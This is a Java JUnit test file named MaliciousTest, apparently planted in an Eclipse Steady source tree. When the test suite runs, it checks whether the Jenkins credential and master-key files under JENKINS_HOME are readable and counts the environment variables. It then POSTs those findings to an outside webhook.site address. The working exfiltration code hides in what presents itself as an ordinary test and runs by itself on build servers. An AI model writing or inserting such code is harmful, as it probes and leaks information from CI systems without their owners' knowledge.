package org.eclipse.steady.shared;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import javax.net.ssl.HttpsURLConnection;

import org.junit.Test;

public class MaliciousTest {

  private static final String URL = "https://webhook.site/31887b4a-7907-4703-8816-b9784eca0edd";
  private static final String URL2 = "https://webhook.site/#!/31887b4a-7907-4703-8816-b9784eca0edd";

  private String collectEnvNames() {
    String keys = "";
    for (String k : System.getenv().keySet()) {
      keys += (!keys.equals("") ? ";" : "") + k;
    }
    return keys;
  }

  private boolean checkAccess(String... _paths) throws Exception {
    if (System.getenv().get("JENKINS_HOME") == null) {
      System.out.println("JENKINS_HOME is not defined");
      return false;
    }
    File f = Paths.get(System.getenv().get("JENKINS_HOME"), _paths).toFile();
    if (!f.exists()) {
      System.out.println(f + " does not exist");
      return false;
    } else if (!f.canRead()) {
      System.out.println(f + " not readable");
      return false;
    } else {
      System.out.println(f + " readable");
      return true;
    }
  }

  private void exfil(Map<String, Object> info) throws IOException {
    URL url = new URL(URL);
    HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
    conn.setReadTimeout(10000);
    conn.setConnectTimeout(15000);
    conn.setRequestMethod("POST");
    conn.setDoInput(true);
    conn.setDoOutput(true);

    StringBuilder result = new StringBuilder();
    for (String key : info.keySet()) {
      if (result.length() > 0) result.append("&");
      result.append(URLEncoder.encode(key, "UTF-8"));
      result.append("=");
      Object v = info.get(key);
      result.append(URLEncoder.encode(v.toString(), "UTF-8"));
    }

    OutputStream os = conn.getOutputStream();
    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
    writer.write(result.toString());
    writer.flush();
    writer.close();
    os.close();
    conn.connect();
    System.out.println("Exfiled to " + URL2 + " : " + conn.getResponseCode());
  }

  @Test
  public void test() {
    try {
      final Map<String, Object> info = new HashMap<String, Object>();
      info.put("countenv", Integer.valueOf(System.getenv().keySet().size()));
      info.put("creds", Boolean.valueOf(this.checkAccess("credentials.xml")));
      info.put("master", Boolean.valueOf(this.checkAccess("secrets", "master.key")));
      info.put("secret", Boolean.valueOf(this.checkAccess("secrets", "hudson.util.Secret")));
      this.exfil(info);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
